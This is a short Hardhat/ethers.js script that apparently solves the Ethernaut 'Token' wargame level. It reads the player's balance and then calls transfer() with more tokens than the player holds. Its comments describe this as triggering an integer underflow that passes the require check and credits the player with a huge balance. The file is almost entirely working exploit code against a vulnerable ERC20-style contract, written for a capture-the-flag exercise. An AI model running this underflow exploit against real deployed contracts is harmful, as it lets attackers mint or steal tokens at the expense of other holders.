import { ethers } from "hardhat";

const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);

//Fit contract name and address (current lvl instance)
const contract = await ethers.getContractAt("Token",CONTRACT_ADDRESS,signer);

// 1. Check player balances and totalSupply
const totalSupply =  (await contract.totalSupply()).toNumber();
let myBalance =  (await contract.balanceOf(PLAYER_ADDRESS)).toNumber();
console.log("Current total supply is: ", totalSupply);
console.log("My balance is: ", myBalance);


// 2. Call transfer() function, with a bigger amount than 20 and valid address,
// to cause an integer underflow, pass the require statement and get large amount in our balance. 
const anotherAddress = "0x14dc79964da2c08b23698b3d3cc7ca32193d9955";
await contract.transfer(anotherAddress, 23);
let newBalance =  await contract.balanceOf(PLAYER_ADDRESS);
console.log("My updated balance is: ", newBalance);


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
